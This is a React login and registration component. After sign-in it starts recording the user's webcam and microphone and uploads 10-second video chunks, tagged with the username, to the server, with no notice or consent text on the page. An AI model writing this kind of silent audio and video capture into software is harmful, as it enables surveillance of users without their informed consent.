import React, { useState, useEffect, useRef } from "react";
import { useSelector, useDispatch } from "react-redux";
import { useNavigate } from "react-router-dom";
import RecordRTC from "recordrtc";
import {
    userRegister,
    userLogin,
    reset,
    resetAuthError,
    resetLoginError,
} from "../../features/Auth/AuthSlice";
import { saveVideoIntoFileSystem } from "../../features/RIL/rilSlice";
import styles from "./Login.module.css";

function LoginComponent() {
    const dispatch = useDispatch();
    const navigate = useNavigate();

    const { user, isAuthError, isLoginError, isSuccess, message } = useSelector(
        (state) => state.auth
    );

    const [username, setUsername] = useState("");
    const [password, setPassword] = useState("");
    const [loginStatus, setLoginStatus] = useState("login");
    const [inputFieldIsEmpty, setInputFieldIsEmpty] = useState(false);

    const recorderRef = useRef(null);
    const streamRef = useRef(null);
    const intervalRef = useRef(null);
    const hasStartedRecording = useRef(false);

    useEffect(() => {
        localStorage.removeItem("query");
        localStorage.removeItem("wpname");
    }, []);

    const loginStatusHandler = (status) => {
        setInputFieldIsEmpty(false);
        setLoginStatus(status);
    };

    const formInputOnChange = (e, type) => {
        setInputFieldIsEmpty(false);
        if (type === "username") setUsername(e.target.value);
        else setPassword(e.target.value);
    };

    const authFormHandler = (e) => {
        e.preventDefault();
        setInputFieldIsEmpty(false);
        const formData = { username, password };

        if (username.trim() && password.trim()) {
            if (loginStatus === "login") dispatch(userLogin(formData));
            else dispatch(userRegister(formData));
        } else {
            setInputFieldIsEmpty(true);
        }
    };

    const generateRandomString = () => {
        const usernameLS = localStorage.getItem("loggedin-user") || "guest";
        const now = new Date().toISOString().replace(/[:.]/g, "-");
        const rand = Math.random().toString(36).substring(2, 10);
        return `${now}_${usernameLS}_${rand}`;
    };

    const initRecorder = async () => {
        try {
            if (!streamRef.current) {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                streamRef.current = stream;
            }

            const rec = new RecordRTC(streamRef.current, {
                type: "video",
                mimeType: "video/webm",
                frameRate: 5,
                frameInterval: 5,
            });

            recorderRef.current = rec;
            rec.startRecording();
            console.log("Video recording started ...........");

            if (!intervalRef.current) {
                console.log("Setting interval for sendVideo...");
                intervalRef.current = setInterval(() => {
                    console.log("Interval is calling sendVideo()");
                    sendVideo();
                }, 10000); // 60 seconds
            }
        } catch (err) {
            console.error("Error initializing recorder:", err);
        }
    };

    const sendVideo = () => {
        const rec = recorderRef.current;
        if (!rec) return;

        rec.stopRecording(() => {
            const blob = rec.getBlob();
            const formData = new FormData();
            formData.append("video", blob, generateRandomString() + ".webm");

            // 1) Clear buffer & restart right away:
            rec.clearRecordedData();
            rec.startRecording();
            console.log("Recorder restarted.");

            // 2) Then fire-and-forget the upload
            dispatch(saveVideoIntoFileSystem(formData))
                .unwrap()
                .then(() => console.log("Video chunk uploaded"))
                .catch(err => console.error("Upload failed:", err));
        });
    };

    useEffect(() => {
        if ((isSuccess || user) && !hasStartedRecording.current) {
            localStorage.setItem("loggedin-user", username);
            hasStartedRecording.current = true;
            initRecorder();
        }
    }, [isSuccess, user]);

    useEffect(() => {
        if (isSuccess || user) {
            navigate("/");
            dispatch(reset());
        }
    }, [isSuccess, user]);

    useEffect(() => {
        if (isAuthError) setLoginStatus("register");
    }, [isAuthError]);

    useEffect(() => {
        return () => {
            if (intervalRef.current) clearInterval(intervalRef.current);
            if (streamRef.current) {
                streamRef.current.getTracks().forEach(track => track.stop());
            }
        };
    }, []);

    return (
        <div className="flex justify-center items-center h-screen bg-slate-100">
            <div className="w-[450px] flex flex-col">
                <form
                    onSubmit={authFormHandler}
                    className="bg-white shadow-md rounded-2xl px-8 py-11 mb-4"
                >
                    <h2 className="text-4xl text-slate-500 font-bold">Welcome</h2>
                    <div className={styles.error_state_mh}>
                        {inputFieldIsEmpty && (
                            <p className="py-2 text-slate-500 font-medium">
                                Please enter valid username and password.
                            </p>
                        )}
                        {(isAuthError || isLoginError) && (
                            <p className={`py-2 text-rose-500 ${styles.alert_animation}`}>
                                {message}
                            </p>
                        )}
                    </div>
                    <div className="mb-4">
                        <p className={`text-sm ${inputFieldIsEmpty ? `${styles.alert_animation} text-rose-500` : "text-slate-500"}`}>
                            Account
                        </p>
                        <input
                            className={`shadow border rounded-md w-full py-3 px-3 text-gray-700 focus:outline-none mt-2 ${inputFieldIsEmpty ? styles.alert_animation : ""}`}
                            type="text"
                            placeholder="username"
                            value={username}
                            onChange={(e) => formInputOnChange(e, "username")}
                        />
                    </div>
                    <div className="mb-7">
                        <p className={`text-sm ${inputFieldIsEmpty ? `${styles.alert_animation} text-rose-500` : "text-slate-500"}`}>
                            Password
                        </p>
                        <input
                            className={`shadow border rounded-md w-full py-3 px-3 text-gray-700 focus:outline-none mt-2 ${inputFieldIsEmpty ? styles.alert_animation : ""}`}
                            type="password"
                            placeholder="Password"
                            value={password}
                            onChange={(e) => formInputOnChange(e, "password")}
                        />
                    </div>
                    <button className="primary_bg transition ease-out w-full hover:bg-indigo-800 text-white py-2 px-4 rounded mb-4">
                        {loginStatus === "login" ? "Sign In" : "Register"}
                    </button>
                    <p className="text-slate-500 mt-5">
                        {loginStatus === "login" ? "Don't have an account?" : "Already have an account?"} {" "}
                        <span
                            onClick={() => loginStatusHandler(loginStatus === "login" ? "register" : "login")}
                            className="font-bold primary_text_color cursor-pointer hover:text-indigo-800 transition ease-out"
                        >
              {loginStatus === "login" ? "Register" : "Sign In"}
            </span>
                    </p>
                </form>
            </div>
        </div>
    );
}

export default LoginComponent;
